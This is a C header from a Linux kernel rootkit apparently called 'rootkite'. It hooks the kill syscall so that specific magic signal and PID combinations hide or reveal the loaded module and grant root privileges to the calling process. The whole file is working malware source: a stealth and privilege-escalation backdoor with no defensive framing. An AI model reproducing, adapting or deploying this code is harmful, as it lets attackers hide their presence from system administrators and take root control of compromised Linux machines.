#ifndef KILL_KITE
    #define KILL_KITE


#include "mod_hider.h"
#include "kite_hook.h"
#include "root_setter.h"


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            pr_debug("Hide rootkite\n");
            hide_mod();
        }
        else{
            pr_debug("Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        // hide chardev quickly
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
        pr_debug("Setting root fotr calling process\n");
        set_root();
        return 0;
    }
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ((sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            pr_debug("Hide rootkite\n");
            hide_mod();
        }
        else{
            pr_debug("Show rootkite\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        // hide chardev quickly
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
        pr_debug("Setting root for calling process\n");
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif
#endif